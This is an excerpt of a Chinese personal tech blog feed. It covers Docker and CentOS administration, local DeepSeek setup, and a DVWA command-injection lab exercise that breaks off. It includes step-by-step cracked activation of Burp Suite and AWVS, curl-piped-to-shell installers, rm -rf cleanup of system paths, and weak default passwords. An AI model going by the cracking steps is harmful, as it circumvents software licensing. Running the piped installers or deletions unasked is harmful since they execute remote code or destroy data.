<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ! <span class="built_in">command</span> -v curl &amp;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;curl 没安装，请先安装！&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="严格错误检查">严格错误检查</h3>
<p>用脚本开头加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -euo pipefail</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-e</code>：检测错误，脚本出错立刻退出。</li>
<li><code>-u</code>：检测使用未定义变量。</li>
<li><code>-o pipefail</code>：检测管道中任一命令失败时让脚本退出。</li>
</ul>
<h3 id="完成后释放资源">完成后释放资源</h3>
<p>用 <code>trap</code> 在脚本退出时做收尾：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">temp_file=$(<span class="built_in">mktemp</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;rm -f $temp_file&#x27;</span> EXIT</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;用完后，脚本退出时会自动删除 <span class="variable">$temp_file</span>&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>基础学习篇</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>shell命令</tag>
      </tags>
  </entry>
  <entry>
    <title>centos-release-scl安装换源</title>
    <url>/2025/03/23/centos-release-scl%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h2 id="安装">安装</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br></pre></td></tr></table></figure>
<p>centos7.9安装后遇到无法使用yum的问题，报错无法访问 <a href="http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo">http://mirrorlist.centos.org?arch=x86_64&amp;release=7&amp;repo=sclo-sclo</a> ，换国内源即可解决</p>
<h2 id="换源">换源</h2>
<p>修改两个文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl.repo /etc/yum.repos.d/CentOS-SCLo-scl.repo.bak</span><br><span class="line">mv /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo.bak</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl.repo</span><br><span class="line">vim /etc/yum.repos.d/CentOS-SCLo-scl-rh.repo</span><br></pre></td></tr></table></figure>
<p>更换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[centos-sclo-rh]</span><br><span class="line">name=CentOS-7 - SCLo rh</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/rh/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br><span class="line"></span><br><span class="line">[centos-sclo-sclo]</span><br><span class="line">name=CentOS-7 - SCLo sclo</span><br><span class="line">baseurl=http://vault.centos.org/centos/7/sclo/x86_64/sclo/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-SCLo</span><br></pre></td></tr></table></figure>
<p>清理缓存并生成新缓存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>centos-release-scl</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuite工具学习版方法</title>
    <url>/2025/02/21/burpsuite%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%89%88%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<blockquote>
<p>来自<code>Datch</code>的使用方法<br>
<a href="https://www.52pojie.cn/thread-1544866-1-1.html">https://www.52pojie.cn/thread-1544866-1-1.html</a></p>
</blockquote>
<p>下载地址也在上面大佬教程；</p>
<p>这里简单记录下工具的使用方法。</p>
<h2 id="kali激活burpsuite">kali激活burpsuite</h2>
<h3 id="jdk切换">jdk切换</h3>
<p>如果后续运行脚本报错，大概率是java的版本问题，21的版本可以使用，可以通过下面这个文章切换版本</p>
<p><a href="/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/">java安装和版本切换方法</a></p>
<h3 id="上传解压包">上传解压包</h3>
<p>上传<code>BurpSuite V2025.1.zip</code>到自定义目录运行命令解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip BurpSuite\ V2025.1.zip </span><br></pre></td></tr></table></figure>
<h3 id="执行激活程序">执行激活程序</h3>
<p>首页的<code>Start.VBS</code>是windows的执行程序，此处不同系统使用不同后缀程序，后面激活步骤相同</p>
<ol>
<li>找到linux执行程序目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd BurpSuite\ V2025.1/Linux/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>赋予执行权限</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x Start.sh</span><br><span class="line">chmod +x CN_Burp.sh</span><br><span class="line">chmod +x EN_Burp.sh</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>执行程序<br>
执行完成后等待页面</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./Start.sh  </span><br></pre></td></tr></table></figure>
<h3 id="激活配置">激活配置</h3>
<ol>
<li>
<p>勾选<code>loader</code>和<code>汉化</code>，点击<code>run</code>，软件就会启动<br>
<img src="/images/pasted-86.png" alt="upload successful"></p>
</li>
<li>
<p><code>取消提交</code>有关bug，接受<br>
<img src="/images/pasted-87.png" alt="upload successful"></p>
</li>
<li>
<p>第一个步骤的<code>license</code>信息，点击copy，粘贴为密钥，下一步<br>
<img src="/images/pasted-88.png" alt="upload successful"></p>
</li>
<li>
<p>选择手动激活</p>
</li>
<li>
<p>复制请求到<code>activation request</code>，然后<code>copy</code>最后的<code>activation response</code>的信息<br>
<img src="/images/pasted-89.png" alt="upload successful"></p>
</li>
<li>
<p><code>copy</code>后<code>粘贴请求</code>点下一步，完成即可。<br>
<img src="/images/pasted-90.png" alt="upload successful"></p>
</li>
</ol>
<h2 id="后续使用">后续使用</h2>
<p>激活后使用该程序可以直接运行<code>BurpSuite\ V2025.1/Linux/</code>下的<code>CN_Burp.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./CN_Burp.sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>工具升级</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>deepseek-r1本地部署方法</title>
    <url>/2025/02/06/deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="安装ollama">安装ollama</h2>
<p>打开ollama官网，根据系统下载ollama软件：<br>
<a href="https://ollama.com/">https://ollama.com/</a><br>
<img src="/images/pasted-76.png" alt="upload successful"></p>
<h2 id="下载模型">下载模型</h2>
<p>安装完成ollama后，通过cmd命令行输入运行相关模型的命令，获取地址是官网的Models页面：<br>
<img src="/images/pasted-77.png" alt="upload successful"></p>
<p>第一个就是需要下载的模型deepseek-r1，点击名称选择需要的版本，即使不符合也能运行，会很卡：<br>
<a href="https://ollama.com/library/deepseek-r1:8b">https://ollama.com/library/deepseek-r1:8b</a><br>
<img src="/images/pasted-78.png" alt="upload successful"></p>
<h2 id="使用">使用</h2>
<p>运行完成后就能正常使用了，这样只能命令行使用；可以通过浏览器插件图形化页面使用本地运行的模型，插件名称是：Page Assist - A Web UI for Local AI Models<br>
<img src="/images/pasted-79.png" alt="upload successful"></p>
<p>说是能联网，但是我的不行</p>
<p>可以用以下话语添加在问题末尾通过其他联网的ai获取信息后给deepseek整理回答，来间接上网：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请先告诉我你要回答这个问题需要检索哪些关键词或者最新消息？我会尝试提供相关数据。</span><br></pre></td></tr></table></figure>
<h2 id="api参数">api参数</h2>
<p>python使用参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:11434/api/generate&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;model&quot;</span>: <span class="string">&quot;deepseek-r1:1.5b&quot;</span>,  <span class="comment"># 替换为你的模型名称</span></span><br><span class="line">    <span class="string">&quot;prompt&quot;</span>: <span class="string">&quot;你好&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: <span class="literal">False</span>  <span class="comment"># 是否启用流式响应</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>deepseek</tag>
      </tags>
  </entry>
  <entry>
    <title>docker pull 镜像ai的理解</title>
    <url>/2025/05/27/docker-pull-%E9%95%9C%E5%83%8Fai%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="🧪-场景">🧪 场景</h2>
<p>你执行 docker pull nginx:latest 时，Docker 是怎么一步步“下载镜像”的？<br>
我们来把这个过程分解为实际步骤，同时继续用“汉堡 🍔”比喻帮助理解每一层。</p>
<h3 id="✅-第-1-步：解析镜像名">✅ 第 1 步：解析镜像名</h3>
<p>你输入的命令：<br>
docker pull nginx:latest</p>
<p>Docker 其实会自动转换为：<br>
<a href="http://registry-1.docker.io/library/nginx:latest">registry-1.docker.io/library/nginx:latest</a></p>
<p>这个地址指的是：</p>
<ol>
<li>官方 Docker Hub（<a href="http://registry-1.docker.io">registry-1.docker.io</a>）</li>
<li>官方镜像库（library）</li>
<li>镜像名：nginx</li>
<li>标签：latest</li>
</ol>
<h3 id="✅-第-2-步：联系-Docker-Hub">✅ 第 2 步：联系 Docker Hub</h3>
<p>Docker 客户端向 Docker Hub 发出请求：<br>
GET /v2/library/nginx/manifests/latest</p>
<p>这一步是拿到清单（manifest），这个清单里记录了：</p>
<ol>
<li>这个镜像由哪些层组成</li>
<li>每一层的校验和（sha256）</li>
<li>每层的大小</li>
<li>支持的平台（比如 amd64、arm64）</li>
</ol>
<blockquote>
<p>📦 比喻：这就像餐厅菜单告诉你：这个汉堡由 5 层组成，分别是面包、生菜、牛肉、奶酪、酱料。</p>
</blockquote>
<h3 id="✅-第-3-步：依次下载每一层（layer）">✅ 第 3 步：依次下载每一层（layer）</h3>
<p>Docker 开始一个个去下载镜像层（也叫“blob”），请求长这样：<br>
GET /v2/library/nginx/blobs/sha256:xxxxxxxxx</p>
<ul>
<li>每一层都是一个压缩包（通常是 tar.gz 文件），里面包含一部分文件系统的变更（新增/修改/删除文件）。</li>
</ul>
<blockquote>
<p>💡 这些“层”可以是：<br>
层编号内容类比<br>
Layer 1 Ubuntu OS 的基础文件系统 汉堡面包底<br>
Layer 2 安装了一些库 加了生菜<br>
Layer 3 加入了 Nginx 服务器 加了牛肉<br>
Layer 4 默认配置文件等 加了酱<br>
Layer 5 启动命令 插了一根旗子（告诉吃法）</p>
</blockquote>
<h3 id="✅-第-4-步：校验层的完整性">✅ 第 4 步：校验层的完整性</h3>
<ul>
<li>每层下载后，Docker 会对文件做 SHA256 校验，确保没有被篡改、损坏。</li>
</ul>
<h3 id="✅-第-5-步：将层缓存到本地">✅ 第 5 步：将层缓存到本地</h3>
<p>层保存到你的本地磁盘：<br>
Linux 路径通常是 /var/lib/docker/overlay2/（默认）</p>
<ul>
<li>每一层是增量的，可复用（比如多个镜像用的是同一个 ubuntu 基础层）</li>
</ul>
<blockquote>
<p>🧠 你下过 nginx 后再下 redis，可能会发现部分层都已经存在，不需要重新下载。</p>
</blockquote>
<h3 id="✅-第-6-步：镜像构建完成，可以运行了">✅ 第 6 步：镜像构建完成，可以运行了</h3>
<p>所有层都下载完之后，Docker 会将它们组合起来，做出一个“可以运行的汉堡”。<br>
你可以用这个命令运行容器：<br>
docker run -d nginx</p>
<ul>
<li>此时容器运行的文件系统，其实是多个只读层 + 一个可写层叠加起来的视图。</li>
</ul>
<blockquote>
<p>🧭 下载时你看到的输出，其实就是每一层：<br>
比如执行时会看到这样的输出：<br>
docker pull nginx:latest<br>
latest: Pulling from library/nginx<br>
ab5ef0e58194: Pull complete     ← 第1层<br>
9d6b7f3f1b66: Pull complete     ← 第2层<br>
e379e8d9f7cd: Pull complete     ← 第3层<br>
…<br>
Digest: sha256:xxx…<br>
每一条 Pull complete 就是一层成功下载并校验完成了。</p>
</blockquote>
<h2 id="✅-小结一句话：">✅ 小结一句话：</h2>
<p>Docker 下载镜像时，不是一次性拿一个“压缩包”，而是像“叠汉堡”一样，一个个去下载构成镜像的文件系统层（layers），最后组合成可运行的镜像。</p>
]]></content>
  </entry>
  <entry>
    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
    <content><![CDATA[<h2 id="问题现象">问题现象</h2>
<p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
<h2 id="解决方法">解决方法</h2>
<p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
<h3 id="停止docker服务">停止docker服务</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
<h3 id="参数修改下载数">参数修改下载数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>
<h3 id="开始下载">开始下载</h3>
<p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 可用镜像源加速镜像025.2.27</title>
    <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="2025-2-27测试可用">2025.2.27测试可用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="启用">启用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 卸载</title>
    <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="卸载命令">卸载命令</h4>
<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">          docker-client \</span><br><span class="line">          docker-client-latest \</span><br><span class="line">          docker-common \</span><br><span class="line">          docker-latest \</span><br><span class="line">          docker-latest-logrotate \</span><br><span class="line">          docker-logrotate \</span><br><span class="line">          docker-selinux \</span><br><span class="line">          docker-engine-selinux \</span><br><span class="line">          docker-engine</span><br></pre></td></tr></table></figure>
<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce \</span><br><span class="line">          docker-ce-cli \</span><br><span class="line">          containerd</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /etc/systemd/system/docker.service</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/<span class="keyword">run</span><span class="language-bash">/docker</span></span><br><span class="line">rm -rf /usr/local/docker</span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /usr/bin/docker* /usr/bin/containerd* /usr/bin/runc /usr/bin/ctr</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 安装</title>
    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="centos">centos</h2>
<h3 id="自动安装docker">自动安装docker</h3>
<p>使用官方安装脚本自动安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
<p>国内安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>
<h3 id="手动安装">手动安装</h3>
<h4 id="卸载旧版本">卸载旧版本</h4>
<p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">         docker-client \</span><br><span class="line">         docker-client-latest \</span><br><span class="line">         docker-common \</span><br><span class="line">         docker-latest \</span><br><span class="line">         docker-latest-logrotate \</span><br><span class="line">         docker-logrotate \</span><br><span class="line">         docker-engine</span><br></pre></td></tr></table></figure>
<h4 id="安装-Docker-Engine-Community">安装 Docker Engine-Community</h4>
<p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
<h4 id="设置仓库">设置仓库</h4>
<p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
<p>设置仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方源地址（比较慢）</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">   </span><br><span class="line">   阿里云</span><br><span class="line">   sudo yum-config-manager \</span><br><span class="line">   --add-repo \</span><br><span class="line">   https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<h4 id="安装-Docker-Engine-Community-2">安装 Docker Engine-Community</h4>
<p>最新版本安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>
<p>查看版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure>
<p>指定版本安装（仅需修改26.1.1）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io</span><br></pre></td></tr></table></figure>
<h3 id="卸载-docker">卸载 docker</h3>
<p>删除安装包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce</span><br></pre></td></tr></table></figure>
<p>删除镜像、容器、配置文件等内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="ubuntu">ubuntu</h2>
<h3 id="检查卸载老版本docker">检查卸载老版本docker</h3>
<p>docker的旧版本不一定被称为docker，<a href="http://docker.io">docker.io</a> 或 docker-engine</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
<h3 id="安装步骤">安装步骤</h3>
<ol>
<li>更新软件包</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>安装docker依赖</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>添加Docker官方GPG密钥</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>添加Docker软件源</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>安装docker</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 使用(mysql5.7为例)</title>
    <url>/2024/08/09/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="拉取镜像">拉取镜像</h2>
<h4 id="配置加速地址">配置加速地址</h4>
<p>国内停服风波后，拉取镜像出现失败的现象，可通过配置加速地址解决（卡顿也可使用此方法）</p>
<pre><code>sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'
&#123;
    &quot;registry-mirrors&quot;: [
        &quot;https://do.nark.eu.org&quot;,
        &quot;https://dc.j8.work&quot;,
        &quot;https://docker.m.daocloud.io&quot;,
        &quot;https://dockerproxy.com&quot;,
        &quot;https://docker.mirrors.ustc.edu.cn&quot;,
        &quot;https://docker.nju.edu.cn&quot;
    ]
&#125;
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
————————————————                   
原文链接：https://blog.csdn.net/weixin_50160384/article/details/139861337
</code></pre>
<p>配置完成后，经过测试能看到已经解决，可通过docker info检查上面配置是否生效。</p>
<h4 id="拉取镜像-2">拉取镜像</h4>
<p>使用docker pull</p>
<pre><code>docker pull mysql:5.7
</code></pre>
<p>拉取完成后，可查看拉取的日志</p>
<pre><code>docker history mysql:5.7
</code></pre>
<h2 id="创建容器">创建容器</h2>
<h4 id="docker-run">docker run</h4>
<p>mysql:5.7需要挂载目录，所以要使用-v挂载，5.7目录为/etc/mysql/conf.d/，要注意其他版本目录位置。</p>
<pre><code>docker run \
--name mysql \
-d \
-p 3306:3306 \
--restart unless-stopped \
-v ./mysql/log:/var/log/mysql \
-v ./mysql/data:/var/lib/mysql \
-v ./mysql/conf:/etc/mysql/conf.d/ \
-e MYSQL_ROOT_PASSWORD=123456 \
mysql:5.7
</code></pre>
<p>如果启动失败可通过命令查看日志，大概率是目录的问题</p>
<pre><code>docker logs mysql:5.7
</code></pre>
<h2 id="容器操作">容器操作</h2>
<p>查看容器信息</p>
<pre><code>docker ps
</code></pre>
<p>容器id为第一列<br>
<img src="/images/pasted-26.png" alt="upload successful"></p>
<p>通过id操作容器</p>
<p>停止容器运行</p>
<pre><code>docker stop 0c36
</code></pre>
<p>启动停止的容器</p>
<pre><code>docker start 0c36
</code></pre>
<p>删除停止的容器</p>
<pre><code>docker rm 0c36
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装awvs并激活</title>
    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="安装awvs">安装awvs</h2>
<h4 id="拉取镜像">拉取镜像</h4>
<p>搜索</p>
<pre><code>docker search awvs
</code></pre>
<p>选择一个awvs镜像下载<br>
<img src="/images/pasted-35.png" alt="upload successful"></p>
<p>选择secfa/awvs的镜像</p>
<pre><code>docker pull secfa/awvs
docker images -a
</code></pre>
<h4 id="创建并启动容器">创建并启动容器</h4>
<p>运行命令</p>
<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
</code></pre>
<p>如果报错！（提示crack失败）<br>
添加参数–cap-add LINUX_IMMUTABLE</p>
<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
</code></pre>
<h2 id="访问">访问</h2>
<p>账号密码：</p>
<pre><code>awvs username: admin@admin.com
awvs password: Admin123
</code></pre>
<h2 id="激活">激活</h2>
<p>需要下载破解版的两个文件替换，分别是：</p>
<pre><code>license_info.json
wa_data.dat
</code></pre>
<p>windows和linux文件通用<br>
替换目录为容器内目录：</p>
<pre><code>/home/acunetix/.acunetix/data/license
</code></pre>
<p>文件传输进入容器命令为：</p>
<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
</code></pre>
<p>重启容器</p>
<pre><code>docker restart 容器id
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>awvs安装</tag>
        <tag>awvs</tag>
      </tags>
  </entry>
  <entry>
    <title>docker目录挂载</title>
    <url>/2024/08/11/docker%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>docker目录的挂载有三种方式，分别试用于不同的场景：<br>
1、Bind Mount将宿主机上的一个文件或目录挂载到容器内。<br>
适用于修改配置文件或者代码文件的目录，容器会和宿主机同步更新。</p>
<p>2、Volume由Docker创建和管理的目录，用于持久化和共享数据，与上述类似，区别在于是使用一个新的，由容器创建的目录</p>
<p>3、tmpfs mount 存储临时文件，存储于主机内存中，不能多容器共享（使用场景少）</p>
<h2 id="Bind-Mount">Bind Mount</h2>
<p>常用命令</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;绝对路径&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<p>使用 --mount 指令进行绑定挂载</p>
<pre><code>docker run -d --name &lt;容器名&gt; --mount type=bind,source=&lt;宿主机目录&gt;,target=&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<h2 id="Volume">Volume</h2>
<p>常用命令&lt;数据卷名称&gt;直接写名字则是在当前目录创建目录</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;数据卷名称&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-命令执行</title>
    <url>/2024/10/14/dvwa-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="Low等级">Low等级</h2>
<p>命令执行漏洞主要是针对有网络测试的页面，如网络设备的web管理页面等等，利用其执行命令的输入窗口执行其他命令。</p>
<p>简单演示一下正常使用，输入127.0.0.1，执行：<br>
<img src="/images/pasted-36.png" alt="upload successful"></p>
<h3 id="在DVWA靶场点击command-injection设置等级为low">在DVWA靶场点击command injection设置等级为low</h3>
<p><img src="/images/pasted-37.png" alt="upload successful"></p>
<h3 id="使用命令连接符如-、-、-、-来执行命令">使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令</h3>
<p>相当于与或非，判断前面命令是否成功执行之后的自定义命令<br>
<img src="/images/pasted-38.png" alt="upload successful"><br>
<img src="/images/pasted-39.png" alt="upload successful"></p>
<h2 id="Medium等级">Medium等级</h2>
<p>做了一点防护措施，相当于没有。<br>
将这些连接符做了个判断转为空，详情如下：<br>
<img src="/images/pasted-40.png" alt="upload successful"></p>
<h3 id="解决方法">解决方法</h3>
<p>测试发现使用命令连接符&amp;&amp;和;都不执行。<br>
<img src="/images/pasted-41.png" alt="upload successful"></p>
<p>但是可以使用其他没有被处理的连接符<br>
